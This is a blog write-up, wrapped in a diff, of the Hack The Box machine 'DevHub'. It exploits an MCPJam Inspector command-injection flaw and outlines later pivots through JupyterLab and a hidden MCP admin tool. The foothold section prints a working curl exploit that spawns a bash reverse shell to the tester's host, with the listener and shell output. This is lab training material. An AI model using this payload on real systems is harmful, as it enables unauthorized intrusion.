@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/10/13/hackthebox-devhub/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewDevHub is a medium-difficulty Linux machine from Hack The Box built entirely around the Model Context Protocol tooling ecosystem — which makes it one of the more interesting boxes I’ve done th">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: DevHub">
+<meta property="og:url" content="http://fouedsaidi.com/2026/10/13/Hackthebox-DevHub/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewDevHub is a medium-difficulty Linux machine from Hack The Box built entirely around the Model Context Protocol tooling ecosystem — which makes it one of the more interesting boxes I’ve done th">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/DevHub/DevHub.png">
+<meta property="article:published_time" content="2026-10-13T14:40:00.000Z">
+<meta property="article:modified_time" content="2026-10-13T14:57:51.031Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="hackthebox">
+<meta property="article:tag" content="MCP">
+<meta property="article:tag" content="MCPJam Inspector">
+<meta property="article:tag" content="CVE-2026-23744">
+<meta property="article:tag" content="Command Injection">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="JupyterLab">
+<meta property="article:tag" content="Jupyter Kernel">
+<meta property="article:tag" content="WebSocket">
+<meta property="article:tag" content="Process Argv Disclosure">
+<meta property="article:tag" content="Flask">
+<meta property="article:tag" content="Hidden MCP Tools">
+<meta property="article:tag" content="SSH Private Key">
+<meta property="article:tag" content="Linux-PE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/DevHub/DevHub.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: DevHub -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: DevHub</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-10-13 17:40</span>
+        <span class="mobile">2026-10-13 17:40</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-10-13 17:57:51</span>
+            <span class="mobile">2026-10-13 17:57:51</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/MCP/">MCP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/MCPJam-Inspector/">MCPJam Inspector</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/CVE-2026-23744/">CVE-2026-23744</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Command-Injection/">Command Injection</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/RCE/">RCE</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/JupyterLab/">JupyterLab</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Jupyter-Kernel/">Jupyter Kernel</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/WebSocket/">WebSocket</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Process-Argv-Disclosure/">Process Argv Disclosure</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Flask/">Flask</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Hidden-MCP-Tools/">Hidden MCP Tools</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/SSH-Private-Key/">SSH Private Key</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Linux-PE/">Linux-PE</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>DevHub is a medium-difficulty Linux machine from Hack The Box built entirely around the <strong>Model Context Protocol</strong> tooling ecosystem — which makes it one of the more interesting boxes I’ve done this year, because the whole chain is made of mistakes that only started existing in the last twelve months. A full-port scan surfaces <strong>MCPJam Inspector</strong> on the non-standard port <code>6274</code>, and that version is vulnerable to <strong>CVE-2026-23744</strong>: the <code>/api/mcp/connect</code> route takes a <code>serverConfig.command</code> straight from an unauthenticated request body and hands it to <code>child_process.spawn()</code>, so we get RCE as <code>mcp-dev</code> with a single <code>curl</code>. From there, loopback enumeration turns up two services the public surface never hinted at — a JupyterLab instance owned by <code>analyst</code> and a <strong>root-owned</strong> Flask app called OpsMCP. JupyterLab’s auth token is sitting in its own <code>argv</code> where any local user can read it with <code>ps</code>, and a Jupyter kernel executes Python as <code>analyst</code>, so that’s our cross-user pivot and the user flag. <code>analyst</code>‘s home then gives up the OpsMCP API key, and the OpsMCP server makes the classic dispatch-map mistake: it filters its <em>listing</em> of tools but not its <em>calling</em> of them, so the hidden <code>ops._admin_dump</code> tool is still fully callable and happily returns root’s SSH private key inline in a JSON response. We SSH in with it as root.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/DevHub/DevHub.png"
+                      alt="DevHub-info-card"
+                ><figcaption>DevHub-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>We start off with our usual full-port nmap scan, which on this box is not optional — a default top-1000 run finds exactly two ports and both of them are dead ends:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ nmap -p- --min-rate=2500 -T4 10.129.13.179 -oN nmap-fast.txt</span><br><span class="line">Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-11 09:14 +0000</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.13.179</span><br><span class="line">Host is up (0.042s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">6274/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 19.88 seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>There it is. <code>6274</code> is well outside the top-1000 range, and if we’d stopped at the default scan we’d have spent the evening fuzzing an nginx vhost for nothing. nmap can’t name the service either, so let’s ask it ourselves:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -s --max-time 5 http://10.129.13.179:6274/ | <span class="built_in">head</span> -20</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">type</span>=<span class="string">&quot;image/svg+xml&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/mcp_jam.svg&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>MCPJam Inspector<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>A React SPA titled <strong>MCPJam Inspector</strong>, with an <code>mcp_jam.svg</code> favicon. That port number is also a giveaway once you’ve seen it before — <code>6274</code> is MCPJam’s default, the same way <code>6277</code> is its proxy port.</p>
+<p>For anyone who hasn’t run into it: MCPJam Inspector is a local debugging UI for the <strong>Model Context Protocol</strong>. You point it at an MCP server, it connects, and it gives you a web interface to browse that server’s tools, resources and prompts and invoke them by hand. It’s basically Postman for MCP servers. The important architectural detail is <em>how</em> it connects to a stdio MCP server: it spawns the server as a child process. You hand it a command, it runs the command, and it talks the protocol over that process’s stdin&#x2F;stdout.</p>
+<p>Which means the entire security model of the thing rests on one assumption — that the only person who can tell it what command to spawn is the developer sitting at the keyboard. On this box, it’s bound to <code>0.0.0.0</code>.</p>
+<p>Port 80, for completeness, is an nginx-served static landing page for the “DevHub” internal portal. We add the hostname to <code>/etc/hosts</code> so vhost-based routing behaves:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ <span class="built_in">echo</span> <span class="string">&quot;10.129.13.179 devhub.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure></div>
+
+<p>There’s nothing on it that moves us forward, though. The inspector is the way in.</p>
+<h2 id="Foothold-—-CVE-2026-23744-MCPJam-Inspector-Command-Injection"><a href="#Foothold-—-CVE-2026-23744-MCPJam-Inspector-Command-Injection" class="headerlink" title="Foothold — CVE-2026-23744: MCPJam Inspector Command Injection"></a>Foothold — CVE-2026-23744: MCPJam Inspector Command Injection</h2><p>The version running here is <code>v1.4.2</code>, which we can confirm later from <code>/opt/mcpjam/node_modules/@mcpjam/inspector/package.json</code> once we’re on-box. That release is vulnerable to <strong>CVE-2026-23744</strong>, and the bug is about as blunt as they come.</p>
+<p>The inspector exposes a backend route at <code>POST /api/mcp/connect</code>. Its job is to take a server definition from the UI and establish a connection to it. For a stdio-transport MCP server, that definition looks like this:</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;serverId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my-server&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;serverConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;npx&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;-y&quot;</span><span class="punctuation">,</span> <span class="string">&quot;@modelcontextprotocol/server-filesystem&quot;</span><span class="punctuation">,</span> <span class="string">&quot;/tmp&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;env&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The handler pulls <code>serverConfig.command</code> and <code>serverConfig.args</code> out of the JSON body and passes them to <code>child_process.spawn(command, args)</code>. There is no allow-list of permitted commands, no check that the binary is an MCP server, no validation of <code>args</code> at all — and, critically, <strong>no authentication on the route</strong>. The inspector was written on the assumption that it’s a localhost-only developer tool, so it never bothered to authenticate anything. Bind it to <code>0.0.0.0</code> and that assumption evaporates: anyone who can reach the port gets to run arbitrary commands as whatever UID the inspector runs under.</p>
+<p>So we don’t need an exploit script here. We need a <code>curl</code> and a listener.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br></pre></td></tr></table></figure></div>
+
+<p>And in a second terminal, we POST a <code>serverConfig</code> whose “MCP server” is a bash reverse shell:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kujen@kujen:~$ curl -s -X POST http://10.129.13.179:6274/api/mcp/connect \</span><br><span class="line">    -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">    -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">          &quot;serverId&quot;:&quot;r1&quot;,</span></span><br><span class="line"><span class="string">          &quot;serverConfig&quot;:&#123;</span></span><br><span class="line"><span class="string">            &quot;command&quot;:&quot;/bin/bash&quot;,</span></span><br><span class="line"><span class="string">            &quot;args&quot;:[&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.32/9001 0&gt;&amp;1&quot;],</span></span><br><span class="line"><span class="string">            &quot;env&quot;:&#123;&#125;</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;error&quot;</span><span class="punctuation">:</span><span class="string">&quot;MCP error -32000: Connection closed&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>That error looks like a failure, and the first time I saw it I nearly moved on. It isn’t. The inspector spawned our process, then tried to perform an MCP initialize handshake over its stdio — and <code>bash -i</code> does not speak JSON-RPC, so the handshake failed and the inspector reported the connection as closed. The response is purely cosmetic. <code>spawn()</code> already happened, and over on the listener:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connect to [10.10.16.32] from (UNKNOWN) [10.129.13.179] 52244</span><br><span class="line">mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ id</span><br><span class="line">uid=1002(mcp-dev) gid=1002(mcp-dev) groups=1002(mcp-dev)</span><br></pre></td></tr></table></figure></div>
+
+<p>Unauthenticated RCE as the <code>mcp-dev</code> service account, from one HTTP request with no payload engineering whatsoever. Let’s upgrade the TTY before we go any further, because we’re going to be doing real work in this shell:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mcp-dev@devhub:~$ python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">mcp-dev@devhub:~$ <span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure></div>
+
+<p>(Then <code>Ctrl+Z</code>, <code>stty raw -echo; fg</code>, <code>Enter</code> on the attacker side as usual.)</p>
+<p><code>mcp-dev</code> owns the inspector and nothing else — no sudo rights, no interesting group membership, and no user flag in its home. It’s a foothold, not a user.</p>
+<h2 id="Internal-Port-Enumeration"><a href="#Internal-Port-Enumeration" class="headerlink" title="Internal Port Enumeration"></a>Internal Port Enumeration</h2><p>The three ports we found from outside are the tip of the iceberg. The first thing worth doing from any fresh foothold is asking the box what it’s listening on <em>locally</em>, because loopback-bound services are written by people who assume nobody untrusted will ever reach them:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mcp-dev@devhub:~$ ss -tlnp</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process</span><br><span class="line">LISTEN  0       128       127.0.0.1:5000        0.0.0.0:*</span><br><span class="line">LISTEN  0       128       127.0.0.1:8888        0.0.0.0:*</span><br><span class="line">LISTEN  0       511         0.0.0.0:6274        0.0.0.0:*      users:((&quot;node&quot;,pid=1134,...))</span><br><span class="line">LISTEN  0       511         0.0.0.0:80          0.0.0.0:*</span><br><span class="line">LISTEN  0       128         0.0.0.0:22          0.0.0.0:*</span><br></pre></td></tr></table></figure></div>
+
+<p>Two new services, both loopback-only. <code>ss</code> won’t show us the process for sockets we don’t own, so we cross-reference with <code>ps</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mcp-dev@devhub:~$ ps -eo user,pid,cmd | grep -E <span class="string">&#x27;5000|8888|opsmcp|jupyter&#x27;</span> | grep -v grep</span><br></pre></td></tr></table></figure></div>
+
